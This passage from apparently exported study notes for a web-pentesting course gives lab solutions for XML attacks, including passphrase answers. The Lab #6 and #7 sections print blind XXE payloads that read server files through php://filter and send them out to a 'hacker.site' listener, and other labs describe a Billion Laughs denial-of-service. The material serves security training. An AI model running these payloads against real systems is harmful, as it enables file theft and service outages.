+</code></pre><p id="75e3c68c-8f32-4c5d-838d-36ca961171e1" class="">Part 2</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3ef66dcd-7a19-4eef-92ed-f4bf35346c3b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">./file_extractor.sh /var/www/5/hidden/
+</code></pre><h3 id="ed3897e4-a6e2-4c2c-be33-7787c2acd81e" class=""><strong>Solutions - Lab #6</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#solutions---lab-6"></a></strong></h3><p id="36d6747e-6424-41fa-b065-8b58b5389649" class="">Blind XXE here. IT requires some OOB exploitations:</p><p id="bfd954a9-23c0-4884-9e35-4223794208ac" class=""><em>Get out of here!!</em> Exploitation steps</p><p id="69354e2f-89be-48a1-9b8a-cd8fac35c0ea" class="">The solution is within .letmepass.php; this is a blind XXE exploitation, so you need to set up an OOB channel.</p><p id="257898ab-975e-456f-85fd-00ecc53241f2" class="">Here are the steps:</p><p id="81c63bbe-4800-4943-b04d-f4076cda07b0" class="">Craft the XML payload moving the external entity definitions in another DTD file (evil_oob.dtd)</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="695c6f4d-a35a-4ac2-b978-e67c2c7562a2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&#x27;1.0&#x27;?&gt;
+&lt;!DOCTYPE xxe [
+    &lt;!ENTITY % EvilDTD SYSTEM &#x27;http://hacker.site/evil_oob.dtd&#x27;&gt;
+    %EvilDTD;
+    %LoadOOBEnt;
+    %OOB;
+]&gt;
+&lt;login&gt;
+    &lt;username&gt;XXEME&lt;/username&gt;
+    &lt;password&gt;password&lt;/password&gt;
+&lt;/login&gt;
+</code></pre><p id="f24ce958-4250-47d7-8d27-13a6f619408f" class="">Create evil_oob.dtd as follows:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e604ee74-dab8-4786-a87a-a5902ccf8479" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;!ENTITY % resource SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/6/.letmepass.php&quot;&gt;
+&lt;!ENTITY % LoadOOBEnt &quot;&lt;!ENTITY &amp;#x25; OOB SYSTEM &#x27;http://hacker.site:2108/?p=%resource;&#x27;&gt;&quot;&gt;
+</code></pre><blockquote id="b79c573b-abc8-41d7-85d6-d855734b2580" class="">[Note] http://hacker.site:2108/xml?p=%resource is the path where the xxeserve shell is listening; you can change it with what you want.</blockquote><ul id="9177d77e-6f07-4cbc-ade6-fcb4036ae890" class="bulleted-list"><li style="list-style-type:disc">Run the xxeserve script</li></ul><p id="306ad9c3-2e4c-41f7-8710-2f2c7bc3b218" class="">ruby xxeserve.rb</p><blockquote id="b5f0fca0-1794-4e44-b202-78bbcfc94df4" class="">[Note] You can improve xxeserve by adding the following lines. With this way, you can customize the port and host to use:</blockquote><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3a1d504f-f060-47ae-898a-1d369b2531cc" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">set :bind, &#x27;hacker.site&#x27;
+set :port, 2108
+</code></pre><p id="8db9700a-0d77-4c81-8ff9-0b9677b351ee" class="">Base64 Decode</p><p id="31638f9c-bfb1-4afd-ba49-40f74a006bc8" class="">Decode what the shell has received! Check the files folder</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0e400c45-28a6-4320-adbf-79989c597dc0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">cat files/{IP.TIME} | base64 -d
+</code></pre><h3 id="be85d3e4-a581-4858-ae25-3c1ff65c43ac" class=""><strong>Solutions - Lab #7</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#solutions---lab-7"></a></strong></h3><p id="50dd2e28-0ce4-449c-8160-a20b3ec0105f" class="">In a folder full of files, there is a special one… the flaw is blind:</p><p id="16e0fc06-4c15-4524-8d35-1dfd713efdbd" class=""><em>Get out of here, but wait… wheres the hidden file?!</em></p><p id="8e47574f-3dbc-44d5-abf9-dcf89e83e902" class="">Exploitation steps</p><p id="c47a47b8-742d-4ae7-a7fa-c2da80e29164" class="">The solution is in Background.php; this is a blind XXE exploitation, so you need to set up an OOB channel.</p><p id="b1c27c60-2562-403c-a77e-1c5ab3c9d66f" class="">Here are the steps:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9bf53b2e-b2b8-458f-9292-bbf076971c2a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Retrieve the .letmepass file for instructions
+- Automate the retrieving process
+</code></pre><p id="ef944ea4-4c27-4568-bfe8-bb11851e80f6" class="">a. Retrieve the .letmepass file for instructions</p><p id="b332f74d-ab87-47a7-8d71-cd3d912ddd75" class="">Craft the XML payload moving the external entity definitions in another DTD file (evil_oob.dtd)</p><p id="563d7da4-b2f5-4ae4-b630-a3dc9fb405a6" class="">File: exploit.sh</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="189fe3e8-3f74-4542-98b9-50f85070c735" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&#x27;1.0&#x27;?&gt;
+&lt;!DOCTYPE xxe [
+    &lt;!ENTITY % EvilDTD SYSTEM &#x27;http://hacker.site/evil_oob.dtd&#x27;&gt;
+    %EvilDTD;
+    %LoadOOBEnt;
+    %OOB;
+]&gt;
+&lt;login&gt;
+    &lt;username&gt;XXEME&lt;/username&gt;
+    &lt;password&gt;password&lt;/password&gt;
+&lt;/login&gt;
+</code></pre><p id="fc189465-cdd8-4fbf-b921-d67e08956192" class="">File: evil_oob.dtd</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e95d5033-7193-49a1-9467-ff141716689d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;!ENTITY % resource SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/7/.letmepass.php&quot;&gt;
+&lt;!ENTITY % LoadOOBEnt &quot;&lt;!ENTITY &amp;#x25; OOB SYSTEM
+&#x27;http://hacker.site:2108/?p=%resource;&#x27;&gt;&quot;&gt;
+</code></pre><blockquote id="ba522286-3e6c-45c1-8e1c-b8463a881a78" class="">[NOTE] http://hacker.site:2108/xml?p=%resource is the path where &gt; the xxeserve shell is listening; you can change it with what you want.</blockquote><ul id="8f38637b-93b7-4d95-a455-6e9e86a7dd43" class="bulleted-list"><li style="list-style-type:disc">Run the xxeserve script<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bf3512b1-84f9-41b4-a9d3-2d9396ede940" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">ruby xxeserve.rb
+</code></pre></li></ul><p id="6611f83e-d72a-44b3-9193-d844b5ca67f9" class="">[NOTE] I added the following lines in order to customize port and host</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e09f155a-8aad-4edb-a35d-cd27f4f13315" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">set :bind, &#x27;hacker.site&#x27;
+set :port, 2108
+</code></pre><p id="6c309caf-efec-4a8c-856e-80445c20cb8d" class="">Decode the .letmepass</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="672005aa-2877-47ed-bdfb-f459f392a1d7" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">file
+</code></pre><p id="4fca3e34-b9e2-444b-a8f5-057eb3b0c3a0" class="">Decode what the shell has received! Check the files folder</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fb867fa5-0654-4a2f-97bb-d4664949b821" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">cat files/{IP.TIME} | base64 -d
+</code></pre><ul id="a8c07dad-585b-4053-886b-6a68a826b24a" class="bulleted-list"><li style="list-style-type:disc">Clear all in files folder</li></ul><p id="1144dd52-4983-4ab1-9cd8-7aef2230e67a" class="">b. Automate the retrieving folder</p><ul id="91e21b82-3201-4613-a4af-7f6871f98074" class="bulleted-list"><li style="list-style-type:disc">Download a list of common PHP file names.</li></ul><ul id="e0cd06a9-5288-4dc5-b3b8-863a69aa31e2" class="bulleted-list"><li style="list-style-type:disc">This is good: Filenames_PHP_Common.wordlist</li></ul><p id="6af61785-1d55-440b-8d07-53b86e7ec332" class="">Make the file extractor script:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3e8419c3-5df1-4c65-8cdf-a5584e7345bc" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">See file_extractor.sh
+</code></pre><blockquote id="6d5b68fa-609b-4604-8552-10ff2029899c" class="">[Note] there are some hardcoded paths within the script, you should adapt them respect to your configuration.</blockquote><p id="f56b1ac9-a9ac-49b7-b018-d7289053d00f" class="">Make a proxy script:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="02a53d39-d82d-48ab-a473-7a0fb7b78922" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">See getOOB.php
+</code></pre><blockquote id="8e2cbdab-5f74-41c4-a67e-1176d509674f" class="">This script is useful, as it can echo custom XML payloads by just passing to it a GET request to resource to extract.</blockquote><h2 id="2f619fc5-174e-4506-9a9c-e6f4ca547919" class=""><strong>Lab 3</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#lab-3"></a></strong></h2><p id="2f8b18ee-ed76-4aaf-a8c7-104a5cefc027" class="">Below, you can find solutions for each task. Remember, though, that you can follow your own strategy, which may be different from the one explained in the following lab.</p><blockquote id="7ccf99d9-475f-44a0-a50b-e81bd77f564b" class="">[NOTE] The techniques to use during this lab are better explained in the study material. You should refer to it for further details. These solutions are provided here only to verify the correctness.</blockquote><h3 id="8d840202-7641-4161-86c8-92c104db7486" class=""><strong>Solutions - Lab #1</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#solutions---lab-1-2"></a></strong></h3><p id="8a135c5b-442f-4c8d-be09-d84ba4b58d97" class="">Simple XEE exploitation warm-up:</p><p id="b77807e7-eab6-43f4-89fd-d00c3fef4f83" class=""><em>You make me laugh so much!</em> Valid Passphrase</p><p id="121ea8e6-c445-4ce8-ba0f-6a8696a0a782" class="">The valid passphrase is We_don’t_like_DoS_attacks Exploitation Steps</p><ul id="9b44f43c-b75e-4917-b894-6e6c5921c9ee" class="bulleted-list"><li style="list-style-type:disc">Testing the login form, you’ll receive a hint that tells you to visit the stats path.</li></ul><ul id="092e5223-1c2f-4bee-b69e-9e888e912ad8" class="bulleted-list"><li style="list-style-type:disc">Open the stats path and check the Physical Memory percentage status.</li></ul><ul id="9eff70ca-db09-4712-b33e-57016211e6a2" class="bulleted-list"><li style="list-style-type:disc">Run the Billion laughs attack against the login parser. If the attack works properly, you’ll notice an alert box with the secret passphrase.</li></ul><h3 id="139f709f-323d-4f23-9461-6f092eac8a06" class=""><strong>Solutions - Lab #2</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#solutions---lab-2-2"></a></strong></h3><p id="68fbc11c-ef03-45ca-b9d4-c20745d5443a" class="">Simple XEE exploitation mixed with a simple XXE exploitation:</p><p id="ac14868e-e94a-49fa-b080-ea427a924e70" class=""><em>We don’t forget how to exploit XXE</em> Valid Passphrase</p><p id="16a4f44c-6806-454c-a57b-1bbe7cc768aa" class="">The valid passphrase is The_second_level_is_done!..like_a_boss Exploitation Steps</p><ul id="223416bf-5e51-4cf4-91b7-c12d5a5cb151" class="bulleted-list"><li style="list-style-type:disc">Testing the login form, you’ll receive a hint that tells you to visit the stats path.</li></ul><ul id="03b44e7c-3f93-4da7-9496-967bf91a8a80" class="bulleted-list"><li style="list-style-type:disc">Open the stats path and check the Physical Memory percentage status.</li></ul><ul id="9ad9a018-e2f2-43ec-94f5-b72b433104c3" class="bulleted-list"><li style="list-style-type:disc">Run the Billion laughs attack against the login parser. If the attack works properly, you’ll notice an alert box with the instructions.</li></ul><p id="687c3075-858e-4c2d-9c3f-16a2efdf4d4e" class="">Run an XXE attack to read the log file and clear some useless text</p><p id="ad9d474f-0e0c-47db-8c79-db2fda701bab" class="">Extract the content from the result. Use awk or gawk, depends on the system:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="68628245-9bcd-492d-8965-d42ad3a59040" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">gawk &#x27;match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;\s/, m) { print m[1] }&#x27;
+</code></pre><p id="e10ae84b-7871-48e4-8e56-10395bda93ad" class="">Remove the JSON escaping characters</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b78d0bb6-85c3-4c3c-b244-4ad1298fb217" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sed &#x27;s/\\\//\//g&#x27;
+</code></pre><p id="68dc9521-d340-47fb-900f-e4a5dbd74463" class="">XEE DoS</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="be8e38e0-ed06-4c5d-be02-29150b9b8e9d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">./exploit.sh
+</code></pre><p id="fefe5ee8-6b78-4aec-b95e-aa7b4bfb3234" class="">XXE log file extraction</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="168c82cc-47ca-4b64-9b8b-6b9060cba8da" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">./exploit_xxe.sh /var/www/XEE/2/LOGS/omg_a_dos.log \
+| gawk &#x27;match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;\s/, m) { print m[1] }&#x27; \
+| sed &#x27;s/\\\//\//g&#x27;./exploit.sh
+</code></pre><h3 id="c77347f0-e2cd-4df1-87de-1ac8533cae68" class=""><strong>Solutions - Lab#3</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#solutions---lab3"></a></strong></h3><p id="032e0bc3-1fc9-4264-b3e6-336059f9657c" class="">Simple XEE+XEE exploitation enriched with a little bit of encoding:</p><p id="b4aebc62-7073-44ea-af2e-2eec59372faf" class=""><em>We don’t forget how encoding works</em> Valid Passphrase</p><p id="41a74d0c-0ef5-4007-ac7f-334e1285e609" class="">The valid passphrase is The_second_level_is_done!..like_a_boss Exploitation Steps</p><ul id="aaf4ce0c-f164-4982-ae9f-f371605c299f" class="bulleted-list"><li style="list-style-type:disc">Testing the login form, you’ll receive a hint that tells you to visit the stats path.</li></ul><ul id="ad6b4655-e4d9-4749-89ff-4515d75616dc" class="bulleted-list"><li style="list-style-type:disc">Open the stats path and check the Physical Memory percentage status.</li></ul><ul id="7024326f-4064-4739-a5ad-887cf718af99" class="bulleted-list"><li style="list-style-type:disc">Run the Billion laughs attack against the login parser. If the attack works properly, you’ll notice an alert box with the instructions.</li></ul><ul id="460b921b-07a9-4b3d-a8fc-374a57a7ea1a" class="bulleted-list"><li style="list-style-type:disc">Run an XXE attack to read the log file and clear some useless text</li></ul><p id="c67ba790-dbf2-4cb4-a90c-bcbd24e140ed" class="">Encode the log path</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="38e94b87-3a89-4d6a-8b22-beb19ff75f13" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">%5BLOGS%5D/omg_%C3%A0_dos.log
+</code></pre><p id="6b5be04f-d3e4-4151-bf0f-62b8ca60b76f" class="">Extract the content from the result. Use awk or gawk, depends on the system:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="24dfb124-039e-4d5c-9483-390b1924f38a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">gawk &#x27;match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;\s/, m) { print m[1] }&#x27;
+</code></pre><p id="9ca38bdb-931b-4b0c-8b1e-2e74062d867c" class="">Remove JSON escaping characters:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="57aff9e7-6b03-4698-a848-a45f7379a197" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sed &#x27;s/\\\//\//g&#x27;
